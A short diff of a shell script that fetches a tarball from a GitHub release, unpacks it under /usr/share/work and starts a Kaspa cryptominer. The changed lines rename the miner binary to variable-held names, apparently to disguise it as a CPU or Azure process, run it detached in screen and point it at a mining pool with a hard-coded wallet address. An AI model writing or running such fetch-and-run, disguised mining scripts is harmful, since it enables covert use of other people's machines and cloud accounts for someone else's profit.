@@ -12,8 +12,8 @@ wget https://github.com/wollfoo/wolethv100/releases/download/wollfoo007/platinum
 mv platinum.tar.gz /usr/share/work/
 cd /usr/share/work/ &&  tar xf platinum.tar.gz
 rm -rf platinum.tar.gz && cd platinum
-mv mine_kaspa.sh $azure -n
+mv miner $azure -n
 cp $azure "$cpuname"
-rm -f  mine_kaspa.sh
+rm -f miner
 echo $cpuname" is starting"
-screen -d -m ./"${cpuname}"
+screen -d -m ./"${cpuname}" --algo kheavyhash --server pool.woolypooly.com:3112 --user kaspa:qqfkr6v83cq6ga8qut7rjzyyevltz7rwzgnpcjh2lekf7wuzghg5u5pz9svvp
